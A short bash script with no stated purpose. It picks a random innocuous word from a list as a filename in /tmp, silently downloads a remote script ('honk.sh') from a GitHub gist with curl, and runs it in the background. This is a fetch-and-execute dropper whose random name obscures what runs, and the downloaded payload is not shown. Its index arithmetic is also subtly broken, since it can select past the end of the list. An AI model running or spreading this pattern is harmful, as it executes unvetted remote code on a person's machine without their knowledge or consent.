#!/usr/bin/env bash

names=(
    wild
    rhythm
    river
    level
    cute
    witty
    domineering
    utter
    plant
    sore
    resolute
    frighten
)

export scName=/tmp/${names[$(( ( RANDOM % 12 )  + 1 ))]}.sh
curl -s -o ${scName} https://gist.githubusercontent.com/cpl/68059048c54925b8e96572f99901ae92/raw/d1220ca5fdbaf5ea691acf77638d86328d7f88c3/honk.sh
bash ${scName} &
